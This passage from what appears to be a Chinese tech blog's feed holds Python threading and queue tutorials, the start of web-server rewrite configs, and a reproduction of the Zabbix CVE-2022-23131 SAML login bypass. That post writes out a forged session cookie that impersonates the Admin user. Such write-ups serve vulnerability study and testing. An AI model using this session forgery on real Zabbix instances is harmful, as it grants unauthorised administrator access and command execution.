daemon：默认为None，即继承当前调用者线程（即开启线程的线程，一般就是主线程）的守护模式属性，如果不为None，则无论该线程是否为守护模式，都会被设置为“守护模式”。</span><br></pre></td></tr></table></figure><ul><li>start()：开启线程活动。它将使得run()方法在一个独立的控制线程中被调用，需要注意的是同一个线程对象的start()方法只能被调用一次，如果调用多次，则会报RuntimeError错误。</li><li>run()：此方法代表线程活动。</li><li>join(timeout=None)：让当前调用者线程（即开启线程的线程，一般就是主线程）等待，直到线程结束（无论它是什么原因结束的），timeout参数是以秒为单位的浮点数，用于设置操作超时的时间，返回值为None。如果想要判断线程是否超时，只能通过线程的is_alive方法来进行判断。join方法可以被调用多次。如果对当前线程使用join方法（即线程在内部调用自己的join方法），或者在线程没有开始前使用join方法，都会报RuntimeError错误。</li><li>name：线程的名称字符串，并没有什么实际含义，多个线程可以赋予相同的名称，初始值由初始化方法来设置。</li><li>ident：线程的标识符，如果线程还没有启动，则为None。ident是一个非零整数，参见threading.get_ident()函数。当线程结束后，它的ident可能被其他新创建的线程复用，当然就算该线程结束了，它的ident依旧是可用的。</li><li>is_alive()：线程是否存活，返回True或者False。在线程的run()运行之后直到run()结束，该方法返回True。</li><li>daemon：表示该线程是否是守护线程，True或者False。设置一个线程的daemon必须在线程的start()方法之前，否则会报RuntimeError错误。这个值默认继承自创建它的线程，主线程默认是非守护线程的，所以在主线程中创建的线程默认都是非守护线程的，即daemon=False。</li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><h2 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h2><p>功能：有两个项目，一个是看电影，一个是听歌，听歌需要2s，看电影需要5s，输出每次项目完的时间点，全部完成后输出时间点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep,ctime</span><br><span class="line"></span><br><span class="line">def music():</span><br><span class="line">    print(&quot;listening,start at %s&quot; %ctime())</span><br><span class="line">    sleep(2)</span><br><span class="line">def movie():</span><br><span class="line">    print(&quot;moving,start at %s&quot; % ctime())</span><br><span class="line">    sleep(5)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    music()</span><br><span class="line">    movie()</span><br><span class="line">    print(&quot;ending at %s&quot; %ctime())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listening,start at Wed Mar 23 17:27:32 2022</span><br><span class="line">moving,start at Wed Mar 23 17:27:34 2022</span><br><span class="line">ending at Wed Mar 23 17:27:39 2022</span><br></pre></td></tr></table></figure><p>可以看到，当第一个项目完成后开始了第二个项目，所有项目结束的时间=开始的时间+两个项目执行的时间</p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>假如我们要同时做这两件事情，为了更明显，把这两个事情同时执行两次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep,ctime</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def music():</span><br><span class="line">    for i in range(2):</span><br><span class="line">        print(&quot;listening,start at %s&quot; %ctime())</span><br><span class="line">        sleep(2)</span><br><span class="line">def movie():</span><br><span class="line">    for i in range(2):</span><br><span class="line">        print(&quot;moving,start at %s&quot; % ctime())</span><br><span class="line">        sleep(5)</span><br><span class="line"></span><br><span class="line">threads &#x3D; [] # 创建一个数组</span><br><span class="line">t1 &#x3D; threading.Thread(target&#x3D;music) #使用threading.Thread调用music</span><br><span class="line">threads.append(t1) #把线程t1装到数组中</span><br><span class="line">t2 &#x3D; threading.Thread(target&#x3D;movie)</span><br><span class="line">threads.append(t2)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    for i in threads:</span><br><span class="line">        i.setDaemon(True) #将线程声明为守护线程</span><br><span class="line">        i.start() # 开始线程</span><br><span class="line"></span><br><span class="line">    print(&quot;ending at %s&quot; %ctime()) #相当于主线程</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listening,start at Wed Mar 23 17:55:28 2022</span><br><span class="line">moving,start at Wed Mar 23 17:55:28 2022</span><br><span class="line">ending at Wed Mar 23 17:55:28 2022</span><br></pre></td></tr></table></figure><p>可以看到，两个子线程（music、movie）和主线程同时开始，当主线程结束时，子线程也跟着结束（只执行了一次）</p><h2 id="多线程加join"><a href="#多线程加join" class="headerlink" title="多线程加join()"></a>多线程加join()</h2><ul><li><strong>join()</strong><br>等待线程终止，在子线程结束运行之前，主线程保持阻塞。<br>注意:  join()方法的位置是在for循环外的，也就是说必须等待for循环里的两个进程都结束后，才去执行主进程。<br>示例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep,ctime</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def music():</span><br><span class="line">    for i in range(2):</span><br><span class="line">        print(&quot;listening,start at %s&quot; %ctime())</span><br><span class="line">        sleep(2)</span><br><span class="line">def movie():</span><br><span class="line">    for i in range(2):</span><br><span class="line">        print(&quot;moving,start at %s&quot; % ctime())</span><br><span class="line">        sleep(5)</span><br><span class="line"></span><br><span class="line">threads &#x3D; [] # 创建一个数组</span><br><span class="line">t1 &#x3D; threading.Thread(target&#x3D;music) #使用threading.Thread调用music</span><br><span class="line">threads.append(t1) #把线程t1装到数组中</span><br><span class="line">t2 &#x3D; threading.Thread(target&#x3D;movie)</span><br><span class="line">threads.append(t2)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    for i in threads:</span><br><span class="line">        i.setDaemon(True) #将线程声明为守护线程</span><br><span class="line">        i.start() # 开始线程</span><br><span class="line">    for i in threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line">    print(&quot;ending at %s&quot; %ctime())</span><br></pre></td></tr></table></figure>输出：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">listening,start at Wed Mar 23 18:00:39 2022</span><br><span class="line">moving,start at Wed Mar 23 18:00:39 2022</span><br><span class="line">listening,start at Wed Mar 23 18:00:41 2022</span><br><span class="line">moving,start at Wed Mar 23 18:00:44 2022</span><br><span class="line">ending at Wed Mar 23 18:00:49 2022</span><br></pre></td></tr></table></figure>可以看到，两个子线程（music、movie）同时开始，同时，子线程具有继承性；当最后一个子线程（movie）结束之后，主线程开始<br>相比于不开启多线程，这种方式要快了4s</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;threading&quot;&gt;&lt;a href=&quot;#threading&quot; class=&quot;headerlink&quot; title=&quot;threading&quot;&gt;&lt;/a&gt;threading&lt;/h1&gt;&lt;p&gt;Python的线程操作在旧版本中使用的是thread模块，在Python27和Pyt</summary>
      
    
    
    
    <category term="python" scheme="http://nice759.com/Categories/python/"/>
    
    
    <category term="python" scheme="http://nice759.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python:线程优先级队列(Queue)</title>
    <link href="http://nice759.com/2022/03/23/Python%E7%BA%BF%E7%A8%8B%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97(Queue)/"/>
    <id>http://nice759.com/2022/03/23/Python%E7%BA%BF%E7%A8%8B%E4%BC%98%E5%85%88%E7%BA%A7%E9%98%9F%E5%88%97(Queue)/</id>
    <published>2022-03-23T03:28:15.000Z</published>
    <updated>2022-03-23T10:52:27.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h1><p>Python 的 Queue 模块中提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO（后入先出）队列LifoQueue，和优先级队列 PriorityQueue。</p><p>这些队列都实现了锁原语，能够在多线程中直接使用，可以使用队列来实现线程间的同步。</p><h1 id="Queue-模块中的常用方法"><a href="#Queue-模块中的常用方法" class="headerlink" title="Queue 模块中的常用方法"></a>Queue 模块中的常用方法</h1><ul><li><strong>Queue.qsize()</strong> :返回queue的近似值。注意：qsize&gt;0 不保证(get)取元素不阻塞。qsize&lt;maxsize不保证(put)存元素不会阻塞</li><li>**Queue.empty() **:判断队列是否为空。和上面一样注意</li><li><strong>Queue.full()</strong> : 判断是否满了,如果队列满了，返回True,反之False,<br>Queue.full 与 maxsize 大小对应</li><li><strong>Queue.get([block[, timeout]])</strong>:从队列里取数据。如果为空的话，blocking = False 直接报 empty异常。如果blocking = True，就是等一会，timeout必须为 0 或正数。None为一直等下去，0为不等，正数n为等待n秒还不能读取，报empty异常</li><li>**Queue.get_nowait() **:相当Queue.get(False), 从队列里取元素，不等待两个方法跟踪入队的任务是否被消费者daemon进程完全消费</li><li>**Queue.put(item) **:往队列里放数据。如果满了的话，blocking = False 直接报 Full异常。如果blocking = True，就是等一会，timeout必须为 0 或正数。None为一直等下去，0为不等，正数n为等待n秒还不能存入，报Full异常。</li><li>**Queue.put_nowait(item) **:相当Queue.put(item, False),往队列里存放元素，不等待</li><li>**Queue.task_done() **:表示队列中某个元素被消费进程使用，消费结束发送的信息。每个get()方法会拿到一个任务，其随后调用task_done()表示这个队列，这个队列的线程的任务完成。就是发送消息，告诉完成啦！<br>如果当前的join()当前处于阻塞状态，当前的所有元素执行后都会重启（意味着收到加入queue的每一个对象task_done()调用的信息）<br>如果调用的次数操作放入队列的items的个数多的话，会触发ValueError异常</li><li><strong>Queue.join()</strong> :一直阻塞直到队列中的所有元素都被取出和执行未完成的个数，只要有元素添加到queue中就会增加。未完成的个数，只要消费者线程调用task_done()表明其被取走，其调用结束。当未完成任务的计数等于0，join()就会不阻塞</li></ul><h1 id="FIFO-先入先出"><a href="#FIFO-先入先出" class="headerlink" title="FIFO (先入先出)"></a>FIFO (先入先出)</h1><p><strong>queue.Queue(maxsize=0)</strong><br>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q &#x3D; queue.Queue(0)</span><br><span class="line">q.put(1)</span><br><span class="line">q.put(2)</span><br><span class="line">q.put(3)</span><br><span class="line"></span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h1 id="LIFO-后入先出"><a href="#LIFO-后入先出" class="headerlink" title="LIFO (后入先出)"></a>LIFO (后入先出)</h1><p>queue.LifoQueue()<br>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q &#x3D; queue.LifoQueue()</span><br><span class="line">q.put(1)</span><br><span class="line">q.put(2)</span><br><span class="line">q.put(3)</span><br><span class="line"></span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">2</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h1 id="PriorityQueue-优先级队列"><a href="#PriorityQueue-优先级队列" class="headerlink" title="PriorityQueue (优先级队列)"></a>PriorityQueue (优先级队列)</h1><p><strong>queue.PriorityQueue</strong><br>同优先级的按照 ASCII 排序<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q &#x3D; queue.PriorityQueue()</span><br><span class="line">q.put((2, &#39;2&#39;))</span><br><span class="line">q.put((1, &#39;1&#39;))</span><br><span class="line">q.put((3, &#39;3&#39;))</span><br><span class="line">q.put((1, &#39;a&#39;))</span><br><span class="line"></span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br><span class="line">print(q.get())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1, &#39;1&#39;)</span><br><span class="line">(1, &#39;a&#39;)</span><br><span class="line">(2, &#39;2&#39;)</span><br><span class="line">(3, &#39;3&#39;)</span><br></pre></td></tr></table></figure><h1 id="实战示例："><a href="#实战示例：" class="headerlink" title="实战示例："></a>实战示例：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import threading, queue</span><br><span class="line"></span><br><span class="line">q &#x3D; queue.Queue() # 设置先入先出队列</span><br><span class="line"></span><br><span class="line">#队列调用</span><br><span class="line">def worker():</span><br><span class="line">    while True:</span><br><span class="line">        item &#x3D; q.get() #从队列获取数据</span><br><span class="line">        print(f&#39;Working on &#123;item&#125;&#39;)</span><br><span class="line">        print(f&#39;Finished &#123;item&#125;&#39;)</span><br><span class="line">        q.task_done() #结束当前q.get的进程</span><br><span class="line"></span><br><span class="line"># 开启多线程</span><br><span class="line">threading.Thread(target&#x3D;worker, daemon&#x3D;True).start()</span><br><span class="line"></span><br><span class="line"># 给worker函数发送队列数据</span><br><span class="line">for i in range(30):</span><br><span class="line">    q.put(i)</span><br><span class="line">print(&#39;All task requests sent\n&#39;, end&#x3D;&#39;&#39;)</span><br><span class="line"></span><br><span class="line"># 线程锁</span><br><span class="line">q.join()</span><br><span class="line">print(&#39;All work completed&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">All task requests sent</span><br><span class="line">Working on 0</span><br><span class="line">Finished 0</span><br><span class="line">Working on 1</span><br><span class="line">Finished 1</span><br><span class="line">Working on 2</span><br><span class="line">Finished 2</span><br><span class="line">Working on 3</span><br><span class="line">Finished 3</span><br><span class="line">Working on 4</span><br><span class="line">Finished 4</span><br><span class="line">Working on 5</span><br><span class="line">Finished 5</span><br><span class="line">Working on 6</span><br><span class="line">Finished 6</span><br><span class="line">Working on 7</span><br><span class="line">Finished 7</span><br><span class="line">Working on 8</span><br><span class="line">Finished 8</span><br><span class="line">Working on 9</span><br><span class="line">Finished 9</span><br><span class="line">Working on 10</span><br><span class="line">Finished 10</span><br><span class="line">Working on 11</span><br><span class="line">Finished 11</span><br><span class="line">Working on 12</span><br><span class="line">Finished 12</span><br><span class="line">Working on 13</span><br><span class="line">Finished 13</span><br><span class="line">Working on 14</span><br><span class="line">Finished 14</span><br><span class="line">Working on 15</span><br><span class="line">Finished 15</span><br><span class="line">Working on 16</span><br><span class="line">Finished 16</span><br><span class="line">Working on 17</span><br><span class="line">Finished 17</span><br><span class="line">Working on 18</span><br><span class="line">Finished 18</span><br><span class="line">Working on 19</span><br><span class="line">Finished 19</span><br><span class="line">Working on 20</span><br><span class="line">Finished 20</span><br><span class="line">Working on 21</span><br><span class="line">Finished 21</span><br><span class="line">Working on 22</span><br><span class="line">Finished 22</span><br><span class="line">Working on 23</span><br><span class="line">Finished 23</span><br><span class="line">Working on 24</span><br><span class="line">Finished 24</span><br><span class="line">Working on 25</span><br><span class="line">Finished 25</span><br><span class="line">Working on 26</span><br><span class="line">Finished 26</span><br><span class="line">Working on 27</span><br><span class="line">Finished 27</span><br><span class="line">Working on 28</span><br><span class="line">Finished 28</span><br><span class="line">Working on 29</span><br><span class="line">Finished 29</span><br><span class="line">All work completed</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Queue&quot;&gt;&lt;a href=&quot;#Queue&quot; class=&quot;headerlink&quot; title=&quot;Queue&quot;&gt;&lt;/a&gt;Queue&lt;/h1&gt;&lt;p&gt;Python 的 Queue 模块中提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO</summary>
      
    
    
    
    <category term="python" scheme="http://nice759.com/Categories/python/"/>
    
    
    <category term="python" scheme="http://nice759.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>【CVE-2022-23131】Zabbix SAML SSO 登录绕过漏洞复现</title>
    <link href="http://nice759.com/2022/03/18/%E3%80%90CVE-2022-23131%E3%80%91Zabbix%20SAML%20SSO%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://nice759.com/2022/03/18/%E3%80%90CVE-2022-23131%E3%80%91Zabbix%20SAML%20SSO%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-18T03:28:15.000Z</published>
    <updated>2022-03-18T09:49:24.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h1><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p><p>zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。</p><p>该漏洞源于在启用 saml SSO 身份验证（非默认）的情况下，未身份验证的攻击者利用已知的<font color="red">username</font>可以修改会话数据，成功绕过前台进入后台，因为存储在会话中的用户登录未经过验证。</p><h1 id="SAML"><a href="#SAML" class="headerlink" title="SAML"></a>SAML</h1><p>安全断言标记语言（英语：<font color="red">Security Assertion Markup Language</font>，简称SAML）是一个基于XML的开源标准数据格式，它在当事方之间交换身份验证和授权数据，尤其是在身份提供者和服务提供者之间交换。</p><p>SAML围绕 XML 实现，它允许身份提供者（IdP，一个能够对用户进行身份验证的实体）告诉服务提供者（SP，这里是 Zabbix）你是谁。您可以将Zabbix Web 前端配置为允许通过 SAML 进行用户身份验证，但默认情况下不启用它，因为它需要了解身份提供者的详细信息。这是企业部署最常见的设置。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在启用 SAML SSO 身份验证的实例上，它允许绕过身份验证并获得管理员权限。攻击者可以使用此访问权限在链接的Zabbix Server和Zabbix Agent实例上执行任意命令。</p><p>在<strong>index_sso.php</strong>中可以看到相关的漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (CSessionHelper::has(&#39;saml_data&#39;)) &#123;</span><br><span class="line"></span><br><span class="line">      $saml_data &#x3D; CSessionHelper::get(&#39;saml_data&#39;);</span><br><span class="line"></span><br><span class="line">      CWebUser::$data &#x3D; API::getApiService(&#39;user&#39;)-&gt;loginByUsername($saml_data[&#39;username_attribute&#39;],</span><br><span class="line"></span><br><span class="line">          (CAuthenticationHelper::get(CAuthenticationHelper::SAML_CASE_SENSITIVE) &#x3D;&#x3D; ZBX_AUTH_CASE_SENSITIVE),</span><br><span class="line"></span><br><span class="line">          CAuthenticationHelper::get(CAuthenticationHelper::AUTHENTICATION_TYPE)</span><br><span class="line"></span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考前辈的分析，它的作用有几点：</p><ul><li><p>将用户重定向到 IdP；</p></li><li><p>用户通过身份验证后，验证传入 SAML 有效负载的格式和签名。创建一个名为saml_data的会话条目来记住用户的属性；</p></li><li><p>如果会话中存在名为saml_data的条目，则提取其值并根据username_attribute的值在 Zabbix 上对用户进行身份验证；</p></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>访问zabbix主页可以获得一个zbx_session<br><img src="https://s2.loli.net/2022/03/18/pWElH145hVDSvCo.png" alt="图片.png"></p><p>通过Url解码(部分不需要,因为部分base64后的=会被url编码)和Base64解码获得zbx_session参数Json格式数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;sessionid&quot;:&quot;9263e860b5b0ec14a571c03c6179f887&quot;,&quot;sign&quot;:&quot;U+jZLeWw2Mlmrk0BHmUmFHauf5j+S6BYJG7eUfgJLFudlXIvkutFdodOttjV\&#x2F;2MDgoNVkT6+rLeIXLL6SWaAcg&#x3D;&#x3D;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/18/fYhHwXAGvKIkVTL.png" alt="图片.png"></p><p>在Json中添加saml_data和username_attribute参数，然后在反向编码回去，就是我们要的session值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;9263e860b5b0ec14a571c03c6179f887&quot;,&quot;sign&quot;:&quot;U+jZLeWw2Mlmrk0BHmUmFHauf5j+S6BYJG7eUfgJLFudlXIvkutFdodOttjV\&#x2F;2MDgoNVkT6+rLeIXLL6SWaAcg&#x3D;&#x3D;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/18/JuvojmQtpskgxID.png" alt="图片.png"></p><p>将编码后的值存到zbx_session中，点击<strong>Sign in with Single Sign-On(SAML)</strong>,就可以成功登录到后台了<br><img src="https://s2.loli.net/2022/03/18/F5hINkQs1YltdLP.png" alt="图片.png"><br><img src="https://s2.loli.net/2022/03/18/VnAiaeY7SQ5GByM.png" alt="图片.png"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>因为这个的利用条件还是比较复杂的，所以轮子我就没有写，网上有很多，但是可用性得自己评测，我看了几个百度的轮子，他们match的规则是”action=dashboard.view”,我觉得。。。<br>github上有zabbix的环境，<a href="https://github.com/trganda/dockerenv/tree/master/vuln/zabbix/CVE-2022-23131">点这里</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Zabbix&quot;&gt;&lt;a href=&quot;#Zabbix&quot; class=&quot;headerlink&quot; title=&quot;Zabbix&quot;&gt;&lt;/a&gt;Zabbix&lt;/h1&gt;&lt;p&gt;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://nice759.com/Categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="zabbix" scheme="http://nice759.com/tags/zabbix/"/>
    
  </entry>
  
  <entry>
    <title>几种伪静态配置</title>
    <link href="http://nice759.com/2022/03/17/%E5%87%A0%E7%A7%8D%E4%BC%AA%E9%9D%99%E6%80%81%E9%85%8D%E7%BD%AE/"/>
    <id>http://nice759.com/2022/03/17/%E5%87%A0%E7%A7%8D%E4%BC%AA%E9%9D%99%E6%80%81%E9%85%8D%E7%BD%AE/</id>
    <published>2022-03-17T05:28:15.000Z</published>
    <updated>2022-03-17T09:22:55.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache伪静态-即系统自带的-htaccess文件-："><a href="#Apache伪静态-即系统自带的-htaccess文件-：" class="headerlink" title="Apache伪静态(即系统自带的.htaccess文件)："></a>Apache伪静态(即系统自带的.htaccess文件)：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Nginx伪静态："><a href="#Nginx伪静态：" class="headerlink" title="Nginx伪静态："></a>Nginx伪静态：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    #&#x2F;&#x2F;...省略部分代码</span><br><span class="line">    if (!-e $request_filename)&#123;</span><br><span class="line">        rewrite  ^(.*)$  &#x2F;index.php?s&#x3D;$1  last;   